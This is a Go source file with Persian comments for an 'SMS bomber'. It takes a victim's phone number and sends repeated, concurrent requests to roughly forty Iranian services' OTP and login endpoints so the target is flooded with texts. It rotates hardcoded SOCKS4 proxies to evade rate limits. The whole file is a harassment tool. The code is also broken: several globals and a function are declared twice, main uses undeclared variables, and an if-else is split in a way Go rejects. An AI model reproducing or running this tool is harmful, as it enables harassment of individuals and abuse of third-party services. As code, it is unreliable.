package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io" // اضافه کردن پکیج io
	"net" // اضافه کردن پکیج net
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"time" // اضافه کردن پکیج time

	// اضافه کردن پکیج proxy از ماژول های توسعه یافته Go
	// قبل از کامپایل، مطمئن شوید که با دستور 'go get golang.org/x/net/proxy' آن را نصب کرده اید
	"golang.org/x/net/proxy"
)

// تابع پاک کردن صفحه (بدون تغییر)
func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

// تابع ارسال درخواست JSON (اصلاح شده برای دریافت client و چاپ جزئیات بیشتر)
func sendJSONRequest(ctx context.Context, client *http.Client, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	jsonData, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while encoding JSON for", url, "!\033[0m", err)
		ch <- 500 // استفاده از 500 برای خطاهای کلی
		return
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while creating request to", url, "!\033[0m", err)
		ch <- 500 // استفاده از 500 برای خطاهای کلی
		return
	}
	req.Header.Set("Content-Type", "application/json")
    // اگر نیاز به هدرهای دیگری دارید، اینجا اضافه کنید

    // استفاده از client سفارشی (که تنظیمات پروکسی دارد)
	resp, err := client.Do(req)
	if err != nil {
		if ctx.Err() == context.Canceled {
			fmt.Println("\033[01;33m[!] Request to", url, "canceled.\033[0m")
			ch <- 0 // استفاده از 0 برای Cancelled
			return
		}
		// نمایش جزئیات خطا شامل آدرس
		fmt.Printf("\033[01;31m[-] Error while sending request to %s! %v\033[0m\n", url, err)

        // تلاش برای خواندن بدنه پاسخ حتی در صورت خطای شبکه کامل
        if resp != nil { // اطمینان از اینکه resp nil نیست در صورت خطای شبکه کامل
             bodyBytes, readErr := io.ReadAll(resp.Body)
             if readErr != nil {
                 fmt.Printf("\033[01;31m[-] Failed to read response body for %s: %v\033[0m\n", url, readErr)
             } else {
                 fmt.Printf("\033[01;31m[-] Received error status %d for %s. Response Body: %s\033[0m\n", resp.StatusCode, url, string(bodyBytes))
             }
        }

		ch <- 500 // استفاده از 500 برای خطاهای کلی ارسال درخواست
		return
	}
	defer resp.Body.Close()

	statusCode := resp.StatusCode
	ch <- statusCode

	// چاپ جزئیات پاسخ برای Status Code 2xx یا 3xx (اختیاری)
	if statusCode < 400 {
         // fmt.Printf("\033[01;32m[+] Successfully sent request to %s. Status: %d\033[0m\n", url, statusCode)
         // اگر میخواهید بدنه پاسخ موفق را هم ببینید، اینجا کدش را اضافه کنید
    } else {
        // برای خطاهای 4xx/5xx بدنه پاسخ را چاپ می کنیم
         bodyBytes, readErr := io.ReadAll(resp.Body)
         if readErr != nil {
             fmt.Printf("\033[01;31m[-] Failed to read response body for %s: %v\033[0m\n", url, readErr)
         } else {
             fmt.Printf("\033[01;31m[-] Received error status %d for %s. Response Body: %s\033[0m\n", statusCode, url, string(bodyBytes))
         }
    }
}

// تابع ارسال درخواست Form (اصلاح شده برای دریافت client و چاپ جزئیات بیشتر)
func sendFormRequest(ctx context.Context, client *http.Client, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while creating form request to", url, "!\033[0m", err)
		ch <- 500 // استفاده از 500 برای خطاهای کلی
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)
	if err != nil {
		if ctx.Err() == context.Canceled {
			fmt.Println("\033[01;33m[!] Request to", url, "canceled.\033[0m")
			ch <- 0 // استفاده از 0 برای Cancelled
			return
		}
		fmt.Printf("\033[01;31m[-] Error while sending request to %s! %v\033[0m\n", url, err)

        if resp != nil {
             bodyBytes, readErr := io.ReadAll(resp.Body)
             if readErr != nil {
                 fmt.Printf("\033[01;31m[-] Failed to read response body for %s: %v\033[0m\n", url, readErr)
             } else {
                 fmt.Printf("\033[01;31m[-] Received error status %d for %s. Response Body: %s\033[0m\n", resp.StatusCode, url, string(bodyBytes))
             }
        }

		ch <- 500 // استفاده از 500 برای خطاهای کلی
		return
	}
	defer resp.Body.Close()

	statusCode := resp.StatusCode
	ch <- statusCode

	if statusCode < 400 {
        // fmt.Printf("\033[01;32m[+] Successfully sent request to %s. Status: %d\033[0m\n", url, statusCode)
    } else {
         bodyBytes, readErr := io.ReadAll(resp.Body)
         if readErr != nil {
             fmt.Printf("\033[01;31m[-] Failed to read response body for %s: %v\033[0m\n", url, readErr)
         } else {
             fmt.Printf("\033[01;31m[-] Received error status %d for %s. Response Body: %s\033[0m\n", statusCode, url, string(bodyBytes))
         }
    }
}


// --- بخش مربوط به Pool پروکسی ---

// لیست آدرس پروکسی های خارجی شما (با طرح http:// یا socks5:// یا socks://)
// شما باید این لیست را با آدرس پروکسی های فعال ایرانی پر کنید
// این لیست گلوبال است و در main پر نمی شود
var proxyList = []string{
    // مثال با آدرس هایی که شما فرستادید (نوع SOCKS4)
    "socks4://212.16.73.229:8888",
    "socks4://94.182.199.250:8080",
    "socks4://217.218.242.75:5678",
    "socks4://77.104.76.26:4145",
    // ... آدرس پروکسی های دیگر با طرح http:// یا socks5:// یا socks4://
    // مثال برای HTTP: "http://proxy.example.com:8080"
    // مثال برای SOCKS5: "socks5://another.socks.server:1080"
    // مثال برای پروکسی با احراز هویت: "http://user:password@auth.proxy.com:8080" یا "socks5://user:password@auth.socks.com:1080"
}

// متغیر و Mutex برای مدیریت چرخش روی لیست پروکسی ها
// این متغیرها هم گلوبال هستند
var proxyIndex int
var proxyMutex sync.Mutex

// DialContext سفارشی برای هندل کردن انواع مختلف پروکسی (HTTP و SOCKS)
func dialContextWithProxyPool(ctx context.Context, network, addr string) (net.Conn, error) {
    proxyMutex.Lock() // برای دسترسی ایمن به proxyIndex
    defer proxyMutex.Unlock()

    if len(proxyList) == 0 {
        // اگر لیست پروکسی خالی است، اتصال مستقیم
        var d net.Dialer
        return d.DialContext(ctx, network, addr)
    }

    // انتخاب پروکسی بعدی از لیست
    proxyURLStr := proxyList[proxyIndex]
    proxyIndex = (proxyIndex + 1) % len(proxyList) // چرخش

    // Parse کردن آدرس پروکسی
    proxyURL, err := url.Parse(proxyURLStr)
    if err != nil {
        fmt.Printf("\033[01;31m[-] Error parsing proxy URL '%s': %v. Connecting directly.\033[0m\n", proxyURLStr, err)
        var d net.Dialer
        return d.DialContext(ctx, network, addr) // در صورت خطای parse، اتصال مستقیم
    }

    // ایجاد Dialer بر اساس نوع پروکسی (http, socks5, socks4)
    var forward proxy.Dialer
    switch proxyURL.Scheme {
    case "http", "https": // اضافه کردن https هم اگرچه کمتر رایج است
        forward, err = proxy.FromURL(proxyURL, proxy.Direct)
    case "socks5", "socks4", "socks":
        // FromURL برای SOCKS5/4 هم کار می کند. برای احراز هویت SOCKS در FromURL نیاز به تنظیمات اضافی در User دارید.
        forward, err = proxy.FromURL(proxyURL, proxy.Direct)
        // اگر نیاز به احراز هویت SOCKS دارید، مطمئن شوید آدرس در proxyList به شکل user:password@host:port باشد.
    default:
         fmt.Printf("\033[01;31m[-] Unsupported proxy scheme '%s' for URL '%s'. Connecting directly.\033[0m\n", proxyURL.Scheme, proxyURLStr)
         var d net.Dialer
         return d.DialContext(ctx, network, addr) // در صورت عدم پشتیبانی طرح، اتصال مستقیم
    }

    if err != nil {
        fmt.Printf("\033[01;31m[-] Error creating proxy dialer for URL '%s': %v. Connecting directly.\033[0m\n", proxyURLStr, err)
        var d net.Dialer
        return d.DialContext(ctx, network, addr) // در صورت خطای ایجاد dialer، اتصال مستقیم
    }

    // اتصال به آدرس نهایی از طریق پروکسی
    // network می تواند "tcp", "tcp4", "tcp6" باشد
    // addr شامل آدرس و پورت نهایی است (مثال: "core.gapfilm.ir:443")
    return forward.DialContext(ctx, network, addr)
}

// --- پایان بخش مربوط به Pool پروکسی ---


func main() {
	clearScreen()

	// ... (کد مربوط به نمایش بنر)
    fmt.Print("\033[01;32m")
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
             *@@%#            -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
              :@@*           =%@@@@@@%-   faster   *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m")

    // --- بخش جدید: انتخاب حالت پروکسی ---
    fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnable proxy? (on/off): \033[00;36m")
    var proxyChoice string
    fmt.Scan(&proxyChoice)

    var client *http.Client // تعریف client خارج از شرط ها
    var tr *http.Transport // تعریف transport خارج از شرط ها

    if strings.ToLower(proxyChoice) == "on" {
        fmt.Println("\033[01;32m[+] Proxy enabled. Initializing connections...\033[0m")

        // --- تنظیم Client با Pool پروکسی ---
        // این لیست را با آدرس پروکسی های خارجی (HTTP یا SOCKS) که پیدا کرده اید پر کنید
        // اگر لیست خالی باشد، برنامه بدون پروکسی اجرا می شود
        // proxyList از قبل در بالای main تعریف شده و شما باید آن را پر کنید
        // var proxyList = []string{ ... }

        // اگر لیست پروکسی خالی است، اعلام میکنیم که بدون پروکسی ادامه می دهیم
        if len(proxyList) == 0 {
             fmt.Println("\033[01;31m[-] Proxy list is empty. Proceeding without proxy.\033[0m")
             tr = &http.Transport{} // Transport پیش فرض (بدون پروکسی)
             client = &http.Client{Transport: tr} // Client بدون پروکسی
        } else {
            // تنظیم DialContext سفارشی برای استفاده از تابع بالا که Pool پروکسی را مدیریت می کند
            tr = &http.Transport{
                DialContext: dialContextWithProxyPool, // <-- استفاده از تابع DialContext با Pool
                DisableKeepAlives: true, // برای اطمینان از استفاده پروکسی جدید برای هر اتصال
                TLSHandshakeTimeout: 10 * time.Second,
                ResponseHeaderTimeout: 10 * time.Second,
            }
             client = &http.Client{Transport: tr} // Client با Pool پروکسی

            // نمایش یک پیام ساده به جای درصد اتصال (پیاده سازی درصد اتصال واقعی پیچیده است)
            fmt.Println("\033[01;32m[+] Proxies configured.\033[0m")
             // می توانید در اینجا یک حلقه کوتاه برای تست اولیه چند پروکسی اضافه کنید
             // اما این کار سرعت شروع برنامه را کاهش می دهد و پیچیدگی اضافه می کند
        }


    } else { // کاربر "off" یا هر چیز دیگری غیر از "on" وارد کرده است
        fmt.Println("\033[01;31m[-] Proxy disabled. Proceeding with direct connection.\033[0m")
        // استفاده از Transport پیش فرض که از تنظیمات سیستم یا بدون پروکسی وصل می شود
        tr = &http.Transport{}
        // می توانید صراحتاً پروکسی را nil کنید:
        // tr := &http.Transport{Proxy: nil} // این مطمئن می شود که از متغیر محیطی هم استفاده نمی کند
         client = &http.Client{Transport: tr} // Client بدون پروکسی
    }

    // --- پایان بخش انتخاب حالت پروکسی ---


	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

    // ... (کد مدیریت سیگنال - بدون تغییر)
    ctx, cancel = context.WithCancel(context.Background()) // تعریف مجدد ctx و cancel برای استفاده در این scope
    signalChan = make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)
	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel()
	}()


	var wg sync.WaitGroup
	ch = make(chan int, repeatCount*40) // تعریف مجدد ch برای استفاده در این scope


	for i := 0; i < repeatCount; i++ {
		// ... (فراخوانی توابع sendJSONRequest و sendFormRequest)
        //client سفارشی را به آن ها پاس دهید (همانند کدهای قبلی)

        // core.gapfilm.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://core.gapfilm.ir/api/v3.2/Account/Login", map[string]interface{}{
			"PhoneNo": phone,
		}, &wg, ch)

		// api.pindo.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.pindo.ir/v1/user/login-register/", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)

        // شما باید تمام فراخوانی های sendJSONRequest و sendFormRequest در این حلقه را اصلاح کنید
        // و پارامتر client را قبل از url اضافه کنید
        // من فقط چند نمونه از API های اصلی شما را در اینجا اصلاح می کنم.
        // لطفا بقیه API ها را خودتان به همین شکل اصلاح کنید.

        // divar.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.divar.ir/v5/auth/authenticate", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)

		// shab.ir login-otp (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		// shab.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{
			"mobile": phone,
			"country_code": "+98",
		}, &wg, ch)

		//Mobinnet
		 wg.Add(1)
		 go func(cl *http.Client, p string) { // client را هم به تابع anonymous پاس دهید
		 	sendJSONRequest(ctx, cl, "https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{"cellNumber": p}, &wg, ch)
		 }(client, phone)

		// api.ostadkr.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.ostadkr.com/login", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		// digikalajet.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)

		// iranicard.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.iranicard.ir/api/v1/register", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		// alopeyk.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://alopeyk.com/api/sms/send.php", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)

		// alopeyk.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.alopeyk.com/safir-service/api/v1/login", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)

		// pinket.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://pinket.com/api/cu/v2/phone-verification", map[string]interface{}{
			"phoneNumber": phone,
		}, &wg, ch)

		// otaghak.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", map[string]interface{}{
			"username": phone,
		}, &wg, ch)

		// banimode.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)

		// gw.jabama.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://gw.jabama.com/api/v4/account/send-code", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		// jabama.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://taraazws.jabama.com/api/v4/account/send-code", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		// torobpay.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.torobpay.com/user/v1/login/", map[string]interface{}{
			"phone_number": phone,
		}, &wg, ch)

		// sheypoor.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://www.sheypoor.com/api/v10.0.0/auth/send", map[string]interface{}{
			"username": phone,
		}, &wg, ch)

		// miare.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{
			"phone_number": phone,
		}, &wg, ch)

		// pezeshket.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.pezeshket.com/core/v1/auth/requestCodeByMobile", map[string]interface{}{
			"mobileNumber": phone,
		}, &wg, ch)

		// classino.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://app.classino.com/otp/v1/api/send_otp", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		// snapp.taxi (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
			"cellphone": phone,
		}, &wg, ch)

		// api.snapp.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)

		// snapp.market(JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
			"cellphone": phone,
		}, &wg, ch)

		// digikala.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
			"username": phone,
		}, &wg, ch)

		// ponisha.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.ponisha.ir/api/v1/auth/register", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		// bitycle.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.bitycle.com/api/account/register", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)

		//barghman (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://uiapi2.saapa.ir/api/otp/sendCode", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		// komodaa.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.komodaa.com/api/v2.6/loginRC/request", map[string]interface{}{
			"phone_number": phone,
		}, &wg, ch)

		// anargift.com auth (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://ssr.anargift.com/api/v1/auth", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		// anargift.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://ssr.anargift.com/api/v1/auth/send_code", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		// digitalsignup.snapp.ir
		wg.Add(1)
		go sendJSONRequest(ctx, client, fmt.Sprintf("https://digitalsignup.snapp.ir/otp?method=sms_v2&cellphone=%v&_rsc=1hiza", phone), map[string]interface{}{
			"cellphone": phone,
		}, &wg, ch)

		// digitalsignup.snapp.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", map[string]interface{}{
			"cellphone": phone,
		}, &wg, ch)

		// Snappfood
		 wg.Add(1)
		 go func(cl *http.Client, p string) { // client را هم به تابع anonymous پاس دهید
		 	formData := url.Values{}
		 	formData.Set("cellphone", p)
		 	sendFormRequest(ctx, cl, "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418", formData, &wg, ch)
		 }(client, phone)

		// khodro45.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{
			"mobile": phone,
			"device_type": 2, // استفاده از payload اصلاح شده
		}, &wg, ch)
//////////////////////////////////////////////////aghe javab nadad bedalil in hast ke modati masdod shodi. Status Code:429

		// irantic.com
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		// basalam.com
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://auth.basalam.com/captcha/otp-request", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		// drnext.ir
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		// digikalajet.ir (Duplicate, keeping one)
		// wg.Add(1)
		// go sendJSONRequest(ctx, client, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
		// 	"phone": phone,
		// }, &wg, ch)

		// caropex.com
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://caropex.com/api/v1/user/login", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		// tetherland.com
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://service.tetherland.com/api/v5/login-register", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		// tandori.ir
		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.tandori.ir/client/users/login", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)


        // اگر میخواهید بین هر چرخه ارسال درخواست به همه APIها مکث کنید
        // time.Sleep(100 * time.Millisecond) // مثال: 100 میلی ثانیه مکث
	}

	go func() {
		wg.Wait()
		close(ch)
	}()

    // ... (کد مربوط به دریافت وضعیت ها از channel و چاپ خروجی)
    fmt.Println("\n\033[01;33m--- Summary --- \033[0m")
    successCount := 0
    errorCount := 0
    canceledCount := 0

    for statusCode := range ch {
        if statusCode >= 200 && statusCode < 400 {
            successCount++
        } else if statusCode == 0 { // 0 را برای Cancelled استفاده کردیم
             canceledCount++
             // اگر 0 را برای خطاهای اولیه هم استفاده میکنید، خط زیر را هم اضافه کنید
             errorCount++
        }
        else { // Status Code 400 به بالا یا خطاهای سرور یا خطاهای ارسال درخواست (که 500 فرستادیم)
            errorCount++
        }
    }

    fmt.Printf("\033[01;32m[+] Successful requests: %d\033[0m\n", successCount)
    fmt.Printf("\033[01;31m[-] Failed requests: %d\033[0m\n", errorCount)
    fmt.Printf("\033[01;33m[!] Canceled requests: %d\033[0m\n", canceledCount) // اگر 0 را فقط برای Cancelled استفاده کرده اید
    fmt.Println("\033[0m") // برگشت به رنگ پیش فرض

}

// --- بخش مربوط به Pool پروکسی ---

// لیست آدرس پروکسی های خارجی شما (با طرح http:// یا socks5:// یا socks://)
// شما باید این لیست را با آدرس پروکسی های فعال ایرانی پر کنید
// این لیست گلوبال است و در main پر نمی شود
var proxyList = []string{
    // مثال با آدرس هایی که شما فرستادید (نوع SOCKS4)
    // این آدرس ها ممکن است فعال نباشند، شما باید لیست خودتان را اینجا قرار دهید
    "socks4://212.16.73.229:8888",
    "socks4://94.182.199.250:8080",
    "socks4://217.218.242.75:5678",
    "socks4://77.104.76.26:4145",
    // ... آدرس پروکسی های دیگر با طرح http:// یا socks5:// یا socks4://
    // مثال برای HTTP: "http://proxy.example.com:8080"
    // مثال برای SOCKS5: "socks5://another.socks.server:1080"
    // مثال برای پروکسی با احراز هویت: "http://user:password@auth.proxy.com:8080" یا "socks5://user:password@auth.socks.com:1080"
}

// متغیر و Mutex برای مدیریت چرخش روی لیست پروکسی ها
// این متغیرها هم گلوبال هستند
var proxyIndex int
var proxyMutex sync.Mutex

// DialContext سفارشی برای هندل کردن انواع مختلف پروکسی (HTTP و SOCKS)
func dialContextWithProxyPool(ctx context.Context, network, addr string) (net.Conn, error) {
    proxyMutex.Lock() // برای دسترسی ایمن به proxyIndex
    defer proxyMutex.Unlock()

    if len(proxyList) == 0 {
        // اگر لیست پروکسی خالی است، اتصال مستقیم
        var d net.Dialer
        return d.DialContext(ctx, network, addr)
    }

    // انتخاب پروکسی بعدی از لیست
    proxyURLStr := proxyList[proxyIndex]
    proxyIndex = (proxyIndex + 1) % len(proxyList) // چرخش

    // Parse کردن آدرس پروکسی
    proxyURL, err := url.Parse(proxyURLStr)
    if err != nil {
        fmt.Printf("\033[01;31m[-] Error parsing proxy URL '%s': %v. Connecting directly.\033[0m\n", proxyURLStr, err)
        var d net.Dialer
        return d.DialContext(ctx, network, addr) // در صورت خطای parse، اتصال مستقیم
    }

    // ایجاد Dialer بر اساس نوع پروکسی (http, socks5, socks4)
    var forward proxy.Dialer
    switch proxyURL.Scheme {
    case "http", "https": // اضافه کردن https هم اگرچه کمتر رایج است
        forward, err = proxy.FromURL(proxyURL, proxy.Direct)
    case "socks5", "socks4", "socks":
        // FromURL برای SOCKS5/4 هم کار می کند. برای احراز هویت SOCKS در FromURL نیاز به تنظیمات اضافی در User دارید.
        forward, err = proxy.FromURL(proxyURL, proxy.Direct)
        // اگر نیاز به احراز هویت SOCKS دارید، مطمئن شوید آدرس در proxyList به شکل user:password@host:port باشد.
    default:
         fmt.Printf("\033[01;31m[-] Unsupported proxy scheme '%s' for URL '%s'. Connecting directly.\033[0m\n", proxyURL.Scheme, proxyURLStr)
         var d net.Dialer
         return d.DialContext(ctx, network, addr) // در صورت عدم پشتیبانی طرح، اتصال مستقیم
    }

    if err != nil {
        fmt.Printf("\033[01;31m[-] Error creating proxy dialer for URL '%s': %v. Connecting directly.\033[0m\n", proxyURLStr, err)
        var d net.Dialer
        return d.DialContext(ctx, network, addr) // در صورت خطای ایجاد dialer، اتصال مستقیم
    }

    // اتصال به آدرس نهایی از طریق پروکسی
    // network می تواند "tcp", "tcp4", "tcp6" باشد
    // addr شامل آدرس و پورت نهایی است (مثال: "core.gapfilm.ir:443")
    return forward.DialContext(ctx, network, addr)
}

// --- پایان بخش مربوط به Pool پروکسی ---
